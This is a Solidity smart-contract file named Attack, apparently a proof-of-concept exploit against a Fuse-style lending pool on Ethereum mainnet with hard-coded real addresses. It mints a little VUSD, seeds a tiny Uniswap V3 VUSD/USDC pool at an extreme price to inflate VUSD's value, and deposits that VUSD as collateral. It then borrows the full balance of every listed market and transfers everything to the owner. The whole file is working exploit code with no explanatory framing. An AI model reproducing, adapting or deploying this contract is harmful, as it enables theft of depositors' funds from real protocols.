
pragma solidity ^0.8;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "./interfaces/IWETH.sol";
import "./interfaces/IMinter.sol";
import "./interfaces/INonfungiblePositionManager.sol";
import "./interfaces/compound/CTokenInterfaces.sol";

import "hardhat/console.sol";

contract Attack is Ownable, IUniswapV3SwapCallback {

    address payable WETH = payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address VUSD = 0x677ddbd918637E5F2c79e164D402454dE7dA8619;

    address USDCWETHPool = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address VUSDUSDCPool = 0x8dDE0A1481b4A14bC1015A5a8b260ef059E9FD89;
    address VUSDMinter = 0xb652Fc42E12828F3F1b3e96283b199E62EC570Db;
    address UniswapV3PositionsNFT = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address Unitroller = 0xF53c73332459b0dBd14d8E073319E585f7a46434;

    address fVUSD23 = 0x2914e8C1c2C54E5335dC9554551438c59373e807;
    address fVVSP23 = 0x63475Ab76E578Ec27ae2494d29E1df288817d931;
    address fWBTC23 = 0x0302F55dC69F5C4327c8A6c3805c9E16fC1c3464;
    address fDAI23 = 0x19D13B4C0574B8666e9579Da3C387D5287AF410c;
    address fSPC23 = 0x712808b1E8A17F90df1Bc0FAA33A6A211c3311a9;
    address fETH23 = 0x258592543a2D018E5BdD3bd74D422f952D4B3C1b;
    address fUSDC23 = 0x2F251E9074E3A3575D0105586D53A92254528Fc5;
    address fVSP23 = 0x0879DbeE0614cc3516c464522e9B2e10eB2D415A;

    address vVSP = 0xbA4cFE5741b357FA371b506e5db0774aBFeCf8Fc;
    address WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address SPC = 0x86ed939B500E121C0C5f493F399084Db596dAd20;
    address VSP = 0x1b40183EFB4Dd766f11bDa7A7c3AD8982e998421;

    // from TickMath.sol
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    receive() external payable {}

    function step1() external payable onlyOwner {
        // deposit ETH for WETH
        IWETH(WETH).deposit{value: msg.value}();
        uint WETHBalance = IERC20(WETH).balanceOf(address(this));

        // swap WETH for USDC
        IUniswapV3Pool(USDCWETHPool).swap(
            address(this),
            false,
            int256(WETHBalance),
            MAX_SQRT_RATIO - 1,
            abi.encode(USDCWETHPool, USDC, WETH)
        );

        // mint 1 VUSD using 1 USDC
        IERC20(USDC).approve(VUSDMinter, type(uint).max);
        IMinter(VUSDMinter).mint(USDC, 1000000);

        // create liquidity pool with 0.1 USDC
        IERC20(USDC).approve(UniswapV3PositionsNFT, type(uint).max);
        INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager.MintParams({
            token0: VUSD,
            token1: USDC,
            fee: 500,
            tickLower: -887260,
            tickUpper: -887250,
            amount0Desired: 0,
            amount1Desired: 100000,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: type(uint).max
        });
        (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) = INonfungiblePositionManager(UniswapV3PositionsNFT).mint(params);

        // swap USDC for VUSD
        uint USDCBalance = IERC20(USDC).balanceOf(address(this));
        IUniswapV3Pool(VUSDUSDCPool).swap(
            address(this),
            false,
            int256(USDCBalance),
            MAX_SQRT_RATIO - 1,
            abi.encode(VUSDUSDCPool, VUSD, USDC)
        );
    }

    function step2() external onlyOwner {

        // mint fVUSD-23 using VUSD
        uint VUSDBalance = IERC20(VUSD).balanceOf(address(this));
        IERC20(VUSD).approve(fVUSD23, type(uint).max);
        CErc20Interface(fVUSD23).mint(VUSDBalance);

        // use fVUSD23 as collateral
        address[] memory cTokens = new address[](1);
        cTokens[0] = fVUSD23;
        ComptrollerInterface(0xF53c73332459b0dBd14d8E073319E585f7a46434).enterMarkets(cTokens);

        uint vVSPBalance = IERC20(vVSP).balanceOf(fVVSP23);
        CErc20Interface(fVVSP23).borrow(vVSPBalance);

        uint WBTCBalance = IERC20(WBTC).balanceOf(fWBTC23);
        CErc20Interface(fWBTC23).borrow(WBTCBalance);

        uint DAIBalance = IERC20(DAI).balanceOf(fDAI23);
        CErc20Interface(fDAI23).borrow(DAIBalance);

        uint SPCBalance = IERC20(SPC).balanceOf(fSPC23);
        CErc20Interface(fSPC23).borrow(SPCBalance);

        uint ETHBalance = fETH23.balance;
        CErc20Interface(fETH23).borrow(ETHBalance);

        uint USDCBalance = IERC20(USDC).balanceOf(fUSDC23);
        CErc20Interface(fUSDC23).borrow(USDCBalance);

        uint VSPBalance = IERC20(VSP).balanceOf(fVSP23);
        CErc20Interface(fVSP23).borrow(VSPBalance);

        moveFunds();
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {
        (address pool, address token0, address token1) = abi.decode(data, (address, address, address));
        if (amount0Delta > 0) {
            IERC20(token0).transfer(pool, uint(amount0Delta));
        } else {
            IERC20(token1).transfer(pool, uint(amount1Delta));
        }
    }

    function moveFunds() internal {
        owner().call{value: address(this).balance}("");
        IERC20(USDC).transfer(owner(), IERC20(USDC).balanceOf(address(this)));
        IERC20(vVSP).transfer(owner(), IERC20(vVSP).balanceOf(address(this)));
        IERC20(WBTC).transfer(owner(), IERC20(WBTC).balanceOf(address(this)));
        IERC20(DAI).transfer(owner(), IERC20(DAI).balanceOf(address(this)));
        IERC20(SPC).transfer(owner(), IERC20(SPC).balanceOf(address(this)));
        IERC20(VSP).transfer(owner(), IERC20(VSP).balanceOf(address(this)));
    }
}